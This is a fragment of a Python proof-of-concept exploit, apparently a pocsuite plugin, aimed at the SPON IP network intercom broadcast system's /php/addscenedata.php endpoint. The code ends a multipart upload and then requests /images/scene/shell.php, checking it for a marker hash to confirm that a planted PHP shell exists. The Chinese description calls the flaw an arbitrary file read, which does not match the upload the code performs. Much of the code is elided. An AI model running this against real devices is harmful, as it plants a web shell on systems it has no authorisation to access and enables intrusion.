...
class POC(POCBase):
    ...
    desc = '''
        世邦通信股份有限公司SPON IP网络对讲广播系统 /php/addscenedata.php 页面存在任意文件读取  
    '''
...
------WebKitFormBoundary4LuoBRpTiVBo9cIQ--'''
        try:
            ...
            resq_results=requests.get(url=self.url+'/images/scene/shell.php')
            if "e165421110ba03099a1c0393373c5b43" in resq_results.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = url
                result['VerifyInfo']['POC'] = path
                result['VerifyInfo']['path'] = self.url+'/images/scene/shell.php'
